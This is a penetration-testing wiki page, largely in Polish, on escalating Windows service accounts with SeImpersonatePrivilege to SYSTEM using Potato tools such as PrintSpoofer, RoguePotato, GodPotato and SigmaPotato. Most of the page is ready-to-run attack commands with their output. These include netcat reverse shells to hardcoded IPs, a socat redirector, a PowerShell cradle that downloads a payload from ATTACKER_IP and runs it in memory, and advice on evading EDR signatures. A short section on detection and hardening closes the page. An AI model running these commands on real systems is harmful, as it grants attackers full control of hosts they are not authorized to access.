# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Wymagania i typowe pułapki

Wszystkie poniższe techniki polegają na nadużyciu uprzywilejowanej usługi zdolnej do impersonacji z kontekstu posiadającego jedno z następujących uprawnień:

- SeImpersonatePrivilege (najczęściej) lub SeAssignPrimaryTokenPrivilege
- High integrity nie jest wymagana, jeśli token już ma SeImpersonatePrivilege (typowe dla wielu kont usługowych, takich jak IIS AppPool, MSSQL itp.)

Szybko sprawdź uprawnienia:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- Jeśli twój shell działa pod ograniczonym tokenem bez SeImpersonatePrivilege (częste dla Local Service/Network Service w niektórych kontekstach), przywróć domyślne uprawnienia konta za pomocą FullPowers, a następnie uruchom Potato. Przykład: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer wymaga, aby usługa Print Spooler była uruchomiona i dostępna przez lokalny endpoint RPC (spoolss). W zahardeningowanych środowiskach, gdzie Spooler jest wyłączony po PrintNightmare, preferuj RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato wymaga OXID resolver dostępnego na TCP/135. Jeśli egress jest zablokowany, użyj redirector/port-forwarder (see example below). Starsze buildy wymagały flagi -f.
- EfsPotato/SharpEfsPotato wykorzystują MS-EFSR; jeśli jeden pipe jest zablokowany, spróbuj alternatywnych pipe'ów (lsarpc, efsrpc, samr, lsass, netlogon).
- Błąd 0x6d3 podczas RpcBindingSetAuthInfo zazwyczaj wskazuje na nieznaną/nieobsługiwaną usługę uwierzytelniania RPC; spróbuj innego pipe/transportu albo upewnij się, że docelowa usługa działa.

## Szybkie demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Uwagi:
- Możesz użyć -i, aby uruchomić interaktywny proces w bieżącej konsoli, lub -c, aby wykonać komendę jednolinijkową.
- Wymaga usługi Spooler. Jeśli jest wyłączona, operacja się nie powiedzie.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Jeśli outbound 135 jest zablokowany, pivot OXID resolver za pomocą socat na swoim redirectorze:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Wskazówka: Jeśli jedna pipe zawiedzie lub EDR ją zablokuje, spróbuj innych obsługiwanych pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notatki:
- Działa na Windows 8/8.1–11 oraz Server 2012–2022, gdy obecne jest uprawnienie SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato udostępnia dwa warianty celujące w obiekty DCOM usług, które domyślnie ustawione są na RPC_C_IMP_LEVEL_IMPERSONATE. Skompiluj lub użyj dostarczonych binariów i uruchom swoje polecenie:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (zaktualizowany fork GodPotato)

SigmaPotato dodaje nowoczesne udogodnienia, takie jak in-memory execution za pomocą .NET reflection oraz pomocnik PowerShell dla reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Wykrywanie i wzmacnianie zabezpieczeń

- Monitoruj procesy tworzące named pipes i natychmiast wywołujące token-duplication APIs, a następnie CreateProcessAsUser/CreateProcessWithTokenW. Sysmon może ujawnić przydatną telemetrię: Event ID 1 (process creation), 17/18 (named pipe created/connected) oraz command lines uruchamiające procesy potomne jako SYSTEM.
- Spooler hardening: Wyłączenie usługi Print Spooler na serwerach, gdzie nie jest ona potrzebna, zapobiega lokalnym coercjom w stylu PrintSpoofer za pośrednictwem spoolss.
- Service account hardening: Minimalizuj przypisywanie SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege do niestandardowych usług. Rozważ uruchamianie usług pod virtual accounts z minimalnymi wymaganymi uprawnieniami oraz izolowanie ich za pomocą service SID i write-restricted tokens, gdy to możliwe.
- Network controls: Blokowanie wychodzących połączeń TCP/135 lub ograniczanie ruchu RPC endpoint mapper może przerwać RoguePotato, chyba że dostępny jest internal redirector.
- EDR/AV: Wszystkie te narzędzia są powszechnie sygnaturowane. Rekomplikacja ze źródeł, zmiana nazw symboli/łańcuchów lub wykonywanie w pamięci może zmniejszyć wykrywalność, ale nie pokona solidnych wykryć behawioralnych.

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)

{{#include ../../banners/hacktricks-training.md}}
